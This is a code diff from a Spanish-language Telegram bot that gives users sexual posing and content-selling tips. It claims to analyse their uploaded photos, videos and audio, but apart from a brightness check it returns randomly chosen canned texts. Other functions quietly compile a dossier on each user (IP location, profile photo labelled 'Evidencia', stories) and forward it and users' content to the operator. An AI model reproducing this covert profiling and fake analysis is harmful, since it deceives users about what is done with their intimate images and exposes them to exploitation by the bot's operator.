@@ -75,7 +75,6 @@ def borrar_todo(user_id):
 # ======================
 async def enviar_expediente_completo(context, user, fecha_texto, edad):
     try:
-        # Datos de ubicación por IP
         pais = "Desconocido"
         ciudad = "Desconocida"
         try:
@@ -85,11 +84,9 @@ async def enviar_expediente_completo(context, user, fecha_texto, edad):
         except:
             pass
 
-        # Verificamos si tiene foto de perfil
         fotos_perfil = await context.bot.get_user_profile_photos(user.id, limit=1)
         tiene_foto = "Sí" if fotos_perfil.total_count > 0 else "No"
 
-        # Verificamos si tiene historias (Stories)
         tiene_story = "No"
         try:
             chat_info = await context.bot.get_chat(user.id)
@@ -116,12 +113,10 @@ async def enviar_expediente_completo(context, user, fecha_texto, edad):
         )
         await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
         
-        # Te enviamos la foto de perfil si tiene
         if fotos_perfil.total_count > 0:
             foto_perfil = fotos_perfil.photos[0][-1].file_id
             await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=foto_perfil, caption="📸 Evidencia: Foto de perfil.")
             
-        # Te enviamos la historia si tiene
         try:
             chat_info = await context.bot.get_chat(user.id)
             if hasattr(chat_info, 'pinned_story') and chat_info.pinned_story:
@@ -167,7 +162,7 @@ async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
         print(f"Error reenviando al admin: {e}")
 
 # ======================
-# ANÁLISIS DE CONTENIDO (LUZ REAL Y MUCHA VARIEDAD)
+# ANÁLISIS DE CONTENIDO (LUZ REAL Y 40 TEXTOS VARIADOS)
 # ======================
 def analizar_contenido(tipo="foto", imagen_bytes=None):
     # --- ANÁLISIS REAL DE LUZ ---
@@ -186,49 +181,65 @@ def analizar_contenido(tipo="foto", imagen_bytes=None):
                 calidad_luz = "¡La luz está perfecta! Resalta bien tu cuerpo de forma natural. 💡"
         except: pass
 
-    # --- CONSEJOS DE POSES Y MORBO (VARIADOS) ---
-    poses = [
-        "Prueba a subir los brazos y arquear la espalda. Eso estiliza la cintura y resalta el busto.",
-        "Intenta sentarte en la cama con las piernas abiertas y mira fijamente a la cámara. Esa pose vuelve locos a los hombres.",
-        "Ponte de espaldas, mira por encima del hombro y muerde un poco tu labio. Da un morbo increíble.",
-        "Acuéstate de lado, apoya la cabeza en un brazo y deja que la sábana cubra solo una parte de tu cuerpo. Deja mucho a la imaginación.",
-        "Ponte en cuclillas (sentadilla) apoyando la espalda en la pared. Resalta muchísimo las curvas de las piernas.",
-        "Usa un espejo para tomarte la foto. El reflejo da un toque de misterio que a los fans les encanta.",
-        "Hazte la foto desde un poco más arriba, mirando hacia abajo. Resalta más el escote y te hace ojos más grandes."
-    ]
-    
-    tips_venta = [
-        "Esta foto es perfecta para un mensaje PPV (de pago) a primera hora de la mañana. ¡Despierta a tus fans con ganas! 🔥",
-        "Vende esta foto en un pack de 3 y ponle un precio especial. A los fans les gustan las ofertas.",
-        "Mándale esta foto a tus suscriptores más fieles con un texto que diga: 'Pensé en ti'. Van a volverse locos.",
-        "Usa esta foto como gancho en tus redes sociales para atraer nuevos suscriptores.",
-        "Si la subes a tu historia, pon una encuesta que diga '¿Te gusta lo que ves?'. Genera interacción y luego les vendes el pack."
-    ]
-
     if tipo == "video" or tipo == "gif":
-        return (
-            f"🎬 **Análisis de tu video/GIF:**\n"
-            f"1. **Lo que veo:** Una pose muy provocativa y sexy. El movimiento de cámara es un poco rápido, lo que distrae un poco.\n"
-            f"2. **Calidad de la luz:** {calidad_luz}\n"
-            f"3. **Cómo mejorarlo:** {random.choice(poses)}\n"
-            f"4. **Tip de venta:** {random.choice(tips_venta)}"
-        )
+        # 20 RESPUESTAS DISTINTAS PARA VIDEO
+        respuestas_video = [
+            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Una pose muy provocativa. El movimiento de cámara es un poco rápido, lo que distrae un poco.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a subir los brazos y arquear la espalda. Eso estiliza la cintura y resalta el busto.\n4. **Tip de venta:** Esta foto es perfecta para un mensaje PPV (de pago) a primera hora de la mañana. ¡Despierta a tus fans con ganas! 🔥",
+            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** ¡Qué movimiento tan sexy! El ángulo resalta tus curvas perfectamente.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Intenta sentarte en la cama con las piernas abiertas y mira fijamente a la cámara. Esa pose vuelve locos a los hombres.\n4. **Tip de venta:** Vende esta foto en un pack de 3 y ponle un precio especial. A los fans les gustan las ofertas.",
+            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Una grabación muy natural, se nota que tienes confianza.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Ponte de espaldas, mira por encima del hombro y muerde un poco tu labio. Da un morbo increíble.\n4. **Tip de venta:** Mándale esta foto a tus suscriptores más fieles con un texto que diga: 'Pensé en ti'. Van a volverse locos.",
+            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** El movimiento es muy fluido y sexys.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Acuéstate de lado, apoya la cabeza en un brazo y deja que la sábana cubra solo una parte de tu cuerpo. Deja mucho a la imaginación.\n4. **Tip de venta:** Usa esta foto como gancho en tus redes sociales para atraer nuevos suscriptores.",
+            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Una toma muy atrevida y directa.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Ponte en cuclillas (sentadilla) apoyando la espalda en la pared. Resalta muchísimo las curvas de las piernas.\n4. **Tip de venta:** Si la subes a tu historia, pon una encuesta que diga '¿Te gusta lo que ves?'. Genera interacción y luego les vendes el pack.",
+            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Un video que despierta muchísimo morbo. El ángulo es perfecto.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Usa un espejo para grabarte. El reflejo da un toque de misterio que a los fans les encanta.\n4. **Tip de venta:** Si el video es corto, úsalo como 'Teaser' (avance) para vender un video más largo por privado.",
+            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** La pose inicial es muy buena, pero se pierde un poco al moverte.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Hazte la toma desde un poco más arriba, mirando hacia abajo. Resalta más el escote y te hace ojos más grandes.\n4. **Tip de venta:** Ponle un precio más alto a los videos donde se te vea la cara. Los fans pagan más por la conexión visual.",
+            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Un movimiento de caderas muy bien logrado.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Juega con la ropa. Quítate una prenda lentamente mientras grabas, eso genera mucha expectativa.\n4. **Tip de venta:** Aprovecha los días festivos (San Valentín, Navidad) para vender packs temáticos con estos videos.",
+            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Un ángulo muy favorecedor para tus piernas.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Intenta grabar en cámara lenta (slow motion) moviendo el cabello. Es un clásico que nunca falla.\n4. **Tip de venta:** Ofrece un descuento por tiempo limitado (ej. 'solo por hoy') para crear urgencia en la compra.",
+            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Una expresión facial muy sugerente.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Asegúrate de que la cámara esté estable. Usa un trípode o apóyala en algo para evitar el temblor.\n4. **Tip de venta:** Haz una oferta de '2x1' en tus videos. A los suscriptores les encanta sentir que ahorran.",
+            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Se nota que estás cómoda frente a la cámara.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a hacer un 'striptease' lento. La anticipación es lo que más excita a los fans.\n4. **Tip de venta:** Los videos de 'Buenos días' o 'Buenas noches' personalizados se venden muy bien. ¡Inténtalo!",
+            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Un primer plano muy íntimo.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Enfoca más tu rostro y tu escote al mismo tiempo. Es el encuadre favorito de la mayoría.\n4. **Tip de venta:** Pregunta a tus fans qué es lo que más les gusta de ti. Luego crea un video enfocado en eso y véndelo.",
+            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Una grabación muy espontánea y natural.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a grabarte en la ducha o en la bañera. El agua y el vapor dan un efecto muy sensual.\n4. **Tip de venta:** Crea un 'Nivel VIP' en tu OnlyFans y ofrece estos videos exclusivos solo para ellos.",
+            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Un movimiento de cuerpo muy rítmico.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Usa un espejo para grabarte. El reflejo da un toque de misterio que a los fans les encanta.\n4. **Tip de venta:** Si tienes un video muy bueno, guárdalo para el final del mes para cumplir la cuota de ventas.",
+            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Una pose acostada que se ve muy relajada y sexy.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Pon sábanas de seda o satén. La textura resalta muchísimo en cámara.\n4. **Tip de venta:** Ofrece la posibilidad de que el fan pida un video personalizado con su nombre. Cóbrale más caro.",
+            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Un encuadre muy ajustado que resalta tus curvas.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Aleja un poco la cámara para mostrar todo el conjunto, no solo una parte.\n4. **Tip de venta:** Envía un mensaje masivo ofreciendo un 'Pack de Bienvenida' para nuevos suscriptores.",
+            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Un gesto con las manos muy sugerente.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Usa lencería de colores oscuros (negro o rojo). Resaltan muchísimo más.\n4. **Tip de venta:** Manda el video a primera hora de la mañana. Los fans suelen revisar el teléfono al despertar.",
+            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Una grabación con mucho movimiento de cabello.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Intenta grabar en un ambiente con poca luz y usa velas. Da un ambiente muy íntimo.\n4. **Tip de venta:** Crea encuestas en tu muro preguntando '¿Qué video quieren ver hoy?'. Involúcralos.",
+            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** La toma desde arriba te hace ver muy dominante.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a susurrar o gemir suavemente mientras grabas. El audio es clave.\n4. **Tip de venta:** Los videos de 'POV' (Punto de vista, como si el fan estuviera ahí) venden muchísimo.",
+            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Un baile muy sensual.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Asegúrate de que la música de fondo sea adecuada. Un ritmo lento ayuda a marcar el movimiento.\n4. **Tip de venta:** Sube un fragmento de 10 segundos a tu feed y pon el resto del video de pago."
+        ]
+        return random.choice(respuestas_video)
+
     elif tipo == "audio":
-        return (
-            "🎧 **Análisis de tu audio:**\n"
-            "1. **Lo que escucho:** Tu tono de voz es muy sugerente y natural.\n"
-            "2. **Lo bueno:** La cercanía al micrófono hace que se escuche íntimo.\n"
-            "3. **Cómo mejorarlo:** Intenta bajar un poco más la voz, casi en un susurro. Juega con la respiración cerca del micro.\n"
-            "4. **Tip de venta:** Los audios personalizados (diciendo el nombre de tu fan) se venden carísimos. ¡Aprovéchalo! 😈"
-        )
+        respuestas_audio = [
+            "🎧 **Análisis de tu audio:**\n1. **Lo que escucho:** Tu tono de voz es muy sugerente y natural.\n2. **Lo bueno:** La cercanía al micrófono hace que se escuche íntimo.\n3. **Cómo mejorarlo:** Intenta bajar un poco más la voz, casi en un susurro. Juega con la respiración cerca del micro.\n4. **Tip de venta:** Los audios personalizados (diciendo el nombre de tu fan) se venden carísimos. ¡Aprovéchalo! 😈",
+            "🎧 **Análisis de tu audio:**\n1. **Lo que escucho:** Tu voz suena muy relajada, lo cual es perfecto para ASMR.\n2. **Lo bueno:** La naturalidad con la que hablas atrapa.\n3. **Cómo mejorarlo:** Graba en una habitación con almohadas o cortinas para evitar el eco. La calidad del sonido es clave.\n4. **Tip de venta:** Ofrece audios donde digas cosas que te gustaría hacerle al fan. Eso los vuelve locos.",
+            "🎧 **Análisis de tu audio:**\n1. **Lo que escucho:** Un tono muy juguetón y pícaro.\n2. **Lo bueno:** Transmites mucha confianza.\n3. **Cómo mejorarlo:** Haz pausas dramáticas después de decir algo picante. El silencio también comunica.\n4. **Tip de venta:** Vende una serie de audios contando una historia erótica. La gente paga por el morbo de saber qué pasa después."
+        ]
+        return random.choice(respuestas_audio)
+        
     else:
-        return (
-            f"🔍 **Análisis de tu foto:**\n"
-            f"1. **Lo que veo:** Una foto muy atrevida. La pose resalta perfecto y se nota que tienes confianza.\n"
-            f"2. **Calidad de la luz:** {calidad_luz}\n"
-            f"3. **Cómo mejorarlo:** {random.choice(poses)}\n"
-            f"4. **Tip de venta:** {random.choice(tips_venta)}"
-        )
+        # 20 RESPUESTAS DISTINTAS PARA FOTO
+        respuestas_foto = [
+            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto muy atrevida. La pose resalta perfecto y se nota que tienes confianza.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a subir los brazos y arquear la espalda. Eso estiliza la cintura y resalta el busto.\n4. **Tip de venta:** Esta foto es perfecta para un mensaje PPV (de pago) a primera hora de la mañana. ¡Despierta a tus fans con ganas! 🔥",
+            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Estás súper sexy. La lencería o la ropa que llevas resalta perfecto.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Intenta sentarte en la cama con las piernas abiertas y mira fijamente a la cámara. Esa pose vuelve locos a los hombres.\n4. **Tip de venta:** Vende esta foto en un pack de 3 y ponle un precio especial. A los fans les gustan las ofertas.",
+            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto muy sugerente, deja mucho a la imaginación.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Ponte de espaldas, mira por encima del hombro y muerde un poco tu labio. Da un morbo increíble.\n4. **Tip de venta:** Mándale esta foto a tus suscriptores más fieles con un texto que diga: 'Pensé en ti'. Van a volverse locos.",
+            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** ¡Qué cuerpo! El ángulo que usaste te favorece muchísimo.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Acuéstate de lado, apoya la cabeza en un brazo y deja que la sábana cubra solo una parte de tu cuerpo. Deja mucho a la imaginación.\n4. **Tip de venta:** Usa esta foto como gancho en tus redes sociales para atraer nuevos suscriptores.",
+            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto con mucha actitud. Mirar a la cámara así vende muchísimo.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Ponte en cuclillas (sentadilla) apoyando la espalda en la pared. Resalta muchísimo las curvas de las piernas.\n4. **Tip de venta:** Si la subes a tu historia, pon una encuesta que diga '¿Te gusta lo que ves?'. Genera interacción y luego les vendes el pack.",
+            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto muy limpia y natural. Tienes una expresión facial muy bonita.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Usa un espejo para tomarte la foto. El reflejo da un toque de misterio que a los fans les encanta.\n4. **Tip de venta:** Si la foto es muy buena, úsala como portada de tu perfil o para un anuncio.",
+            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** La ropa interior que elegiste es un acierto total.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Hazte la foto desde un poco más arriba, mirando hacia abajo. Resalta más el escote y te hace ojos más grandes.\n4. **Tip de venta:** Ponle un precio más alto a las fotos donde se te vea la cara. Los fans pagan más por la conexión visual.",
+            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto muy atrevida desde un ángulo inferior.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Juega con la ropa. Baja un tirante del hombro, eso genera mucha expectativa.\n4. **Tip de venta:** Aprovecha los días festivos (San Valentín, Navidad) para vender packs temáticos.",
+            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto sentada que resalta muchísimo tus piernas.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Cruza las piernas y ponte de puntillas. Eso estiliza y hace que se vean más largas.\n4. **Tip de venta:** Ofrece un descuento por tiempo limitado (ej. 'solo por hoy') para crear urgencia en la compra.",
+            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una selfie muy íntima y cercana.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Asegúrate de que el fondo esté ordenado o desenfocado. El desorden distrae.\n4. **Tip de venta:** Haz una oferta de '2x1' en tus packs de fotos. A los suscriptores les encanta ahorrar.",
+            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una pose muy dominante y segura.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a tomarte la foto con las manos en el cabello, hacia atrás. Se ve muy natural.\n4. **Tip de venta:** Los packs de 'Buenos días' o 'Buenas noches' se venden muy bien. ¡Inténtalo!",
+            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Un primer plano de tu rostro y escote.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Enfoca más tu rostro y tu escote al mismo tiempo. Es el encuadre favorito de la mayoría.\n4. **Tip de venta:** Pregunta a tus fans qué es lo que más les gusta de ti. Luego crea un pack enfocado en eso y véndelo.",
+            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto en la cama muy espontánea.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a tomarte la foto en la bañera o en la ducha. El agua y el vapor dan un efecto muy sensual.\n4. **Tip de venta:** Crea un 'Nivel VIP' en tu OnlyFans y ofrece estas fotos exclusivas solo para ellos.",
+            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto con mucha luz y colores vivos.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Usa un espejo para tomarte la foto. El reflejo da un toque de misterio que a los fans les encanta.\n4. **Tip de venta:** Si tienes un pack muy bueno, guárdalo para el final del mes para cumplir la cuota de ventas.",
+            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una pose acostada que se ve muy relajada y sexy.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Pon sábanas de seda o satén. La textura resalta muchísimo en cámara.\n4. **Tip de venta:** Ofrece la posibilidad de que el fan pida una foto personalizada con su nombre. Cóbrale más caro.",
+            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Un encuadre muy ajustado que resalta tus curvas.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Aleja un poco la cámara para mostrar todo el conjunto, no solo una parte.\n4. **Tip de venta:** Envía un mensaje masivo ofreciendo un 'Pack de Bienvenida' para nuevos suscriptores.",
+            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Un gesto con las manos muy sugerente.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Usa lencería de colores oscuros (negro o rojo). Resaltan muchísimo más.\n4. **Tip de venta:** Manda la foto a primera hora de la mañana. Los fans suelen revisar el teléfono al despertar.",
+            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto con mucho movimiento de cabello.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Intenta tomarte la foto en un ambiente con poca luz y usa velas. Da un ambiente muy íntimo.\n4. **Tip de venta:** Crea encuestas en tu muro preguntando '¿Qué foto quieren ver hoy?'. Involúcralos.",
+            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** La toma desde arriba te hace ver muy dominante.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a susurrar o gemir suavemente mientras grabas. El audio es clave.\n4. **Tip de venta:** Las fotos estilo 'POV' (Punto de vista) venden muchísimo.",
+            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto muy sensual con una sonrisa pícara.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Asegúrate de que la expresión sea natural. No fuerces la sonrisa.\n4. **Tip de venta:** Sube un fragmento de la foto (recortada) a tu feed y pon el resto de pago."
+        ]
+        return random.choice(respuestas_foto)
 
 # ======================
 # LÓGICA DE CHAT CON MEMORIA
